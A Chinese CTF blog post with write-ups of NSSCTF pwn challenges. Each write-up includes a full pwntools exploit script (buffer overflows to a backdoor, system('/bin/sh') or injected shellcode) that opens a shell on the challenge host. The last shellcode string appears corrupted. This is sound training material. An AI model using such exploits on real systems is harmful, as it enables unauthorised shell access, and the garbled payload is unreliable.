---
title: "Pwn练习题"
date: 2023-12-05
categories: 
  - "pwn"
tags: 
  - "ctf"
---

题目来源于NSSCTF网站

## ret2text

### \[SWPUCTF 2021 新生赛\]gift\_pwn

先放到虚拟机里checksec一下，能看到开启NX，没有PIE，64位

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701694411-image.png)

放进64位的IDA反编译一下，可以看到在gift函数里留了后门

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701694499-image.png)

然后再vuln函数里有read函数，存在溢出

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701694609-image.png)

ret2text的基本做法就是让读入的buf溢出到system/bin/sh的地址

这里对于buf的长度，有两种判断方式，要么直接看IDA反编译的结果（这个有可能不准），要么就进入动态调试查看

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701700201-image.png)

这里先将read函数的地址复制下来在虚拟机的pwndbg里进行断点调试

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701700257-image.png)

计算RAX和RBP的差值，即为数组的实际长度

```
print(0x7fffffffe380-0x7fffffffe370)
#16
```

那么ret2text的基本框架就是这样👇

```
from pwn import *

io = remote('node4.anna.nssctf.cn',28980)
target=0x00000000004005C4  #system/bin/sh的地址

payload=b'a'*(16+8)+p64(target)  #栈溢出
#如果是32位指针大小就是4，如果是64位指针大小就是8
io.send(payload)
io.interactive()
```

### \[BJDCTF 2020\]babystack2.0

先check一下，用IDA64位打开

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701700687-image.png)

先看main函数源码

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701700757-image.png)

可以得出，先要输名字的长度，然后再read，buf是12位，也可以进行调试算（我这题调不出来，可以直接用IDA给的数据

由于有两个输入点，一个是scanf，另一个是read，scanf这个点可以随便填，重点在于read部分的溢出

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701701940-image.png)

buf的数组长度应该是由注释部分来计算得到0x10

那么还是套基本框架写脚本

```
from pwn import *

io = remote('node4.anna.nssctf.cn',28559)

target=0x040072A  #system/bin/sh的地址

payload=b'a'*(24)+p64(target)  #栈溢出
io.sendlineafter('name:',b'-1')

io.sendafter('name?',payload)

io.interactive()
```

对于read函数来说是不需要用sendline的，sendline会在末尾加一个换行符，也就是回车，scanf是必须要回车结尾的。

### \[NISACTF 2022\]ezstack

用32位IDA打开

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701704146-image.png)

可以看到在shell函数里存在溢出

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701704194-image.png)

这里没有直接可以使用是system/bin/sh

不过经过查找在plt连接表段里有system的地址，在data段里有/bin/sh的字符串可以凑成命令

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701704558-image.png)

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701704622-image.png)

这道题有点libc的感觉

先溢出，然后到system的连接地址，然后补充4个单位的垃圾数据，最后是/bin/sh的命令字符串

**当程序调用system函数时，会自动去寻找栈底即ebp指向的位置，然后将ebp+8字节的位置的数据当作函数的参数，所以如果我们想将/bin/sh作为system函数的参数，就可以在栈溢出的时候，先修改eip为system函数的地址，然后填充4个字节的垃圾数据，再将/bin/sh的地址写入栈上，这样调用system函数的时候，就可以将/bin/sh作为参数，然后返回一个shell。**(这是为什么要在systemaddr后面补4个字节的原因

具体可查：[PWN疑难（1-3）-关于payload中栈的布置以及system的一些困惑 (yuque.com)](https://www.yuque.com/cyberangel/rg9gdm/igq0ed)

```
from pwn import *

io = remote('node5.anna.nssctf.cn',28088)

system_addr=0x08048390
binsh_addr=0x0804A024

payload=b'a'*(0x48+4)+p32(system_addr)+b'a'*4+p32(binsh_addr)

io.send(payload)
io.interactive()
```

### \[NISACTF 2022\]ezpie

先checksec，32位，开启了pie保护，这就造成了地址的随机化，但是地址的相对位移的不变的

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701763854-image.png)

使用readelf工具查看地址

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701763956-image.png)

可以看到main函数和shell函数的地址

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701763997-image.png)

那么可以这样写脚本👇

```
from pwn import *

io = remote('node5.anna.nssctf.cn',28902)

main_addr=0x00000770
shell_addr=0x0000080f
offset=shell_addr-main_addr #计算偏移量

main_real_addr=int(io.recvuntil('70')[-10:].decode(),16)#根据IDA源码可知
shell_real_addr=main_real_addr+offset  #拼接出真实的shell地址
payload=b'a'*(0x28+4)+p32(shell_real_addr) #溢出即可
io.send(payload)
io.interactive()
```

### 极客大挑战2023 ret2text

可以看到开启了PIE保护，导致地址随机化

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701767586-image.png)

在backdoor里发现后门函数

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701767666-image.png)

由于PIE特性，只有最后两个字节会不同，只需要覆盖最后两个字节到backdoor即可，又因为地址是随机化的，只能概率性获得shell

脚本如下👇

```
from pwn import *

io=process("./ret2text")

backdoor=0x1227  #后门地址
payload=b'a'*88+p16(backdoor)  #只需要覆盖两个字节即可
while True:
    io.send(payload)
    io.interactive()
```

## ret2shellcode

### \[HNCTF 2022 Week1\]ret2shellcode

先进行check

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701774967-image.png)

在IDA中看到main函数

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701775037-image.png)

源码中并不存在/bin/sh的地址，不过buff处于bss段是可写的

在read函数的call部分打个断点，用vmmap查看

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701775332-image.png)

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701775341-image.png)

发现地址为0x404000到0x405000的地址段是可读写可执行的

那么就要尝试发送shellcode到buff段，然后溢出到buff的地址（就这道题而言

编写脚本👇

```
from pwn import *
context(log_level = "debug", arch = 'amd64')
io=remote('node5.anna.nssctf.cn', 28167)
buff_addr = 0x4040A0
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x100+8, b'a') + p64(buff_addr)
io.sendline(payload)
io.interactive()
```

其中使用了系统自带的shellcraft，一定要设置context，不然就会无回显或者报错，建议类似的shellcode都要加context

### \[HNCTF 2022 Week1\]ezr0p32

check一下

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701776670-image.png)

主要的函数内容

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701776746-image.png)

经过简单分析，可以看到plt段存有system的地址，

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701777037-image.png)

而且在bss段也有可写入的buf区间

这道题的步骤就是在第一个read函数处写入/bin/sh，然后在第二个read读取是时候溢出到plt的system地址，然后拿到shell

编写脚本👇

```
from pwn import *
io=remote('node5.anna.nssctf.cn',28772)
system_addr=0x080483D0
bss_addr=0x804a080

payload='/bin/sh'
io.sendafter('please tell me your name\n',payload)

payload=b'a'*(28+4)+p32(system_addr)+p32(0)+p32(bss_addr)
io.sendafter("now it's your play time~\n",payload)

io.interactive()

```

### \[HNCTF 2022 Week1\]safe\_shellcode

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701778197-image.png)

源码是这样的👇

![](https://www.hyhforever.top/wp-content/uploads/2023/12/1701778339-image.png)

其中对输入的s有ascii值的判断，大概就是必须是可见字符，不然就exit

然后把s推到buff里，执行buff

编写脚本👇

```
from pwn import *
io=remote('node5.anna.nssctf.cn',28428)
context(log_level='debug',arch='amd64', os='linux')
shellcode='Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa'

io.send(shellcode)
io.interactive()
```
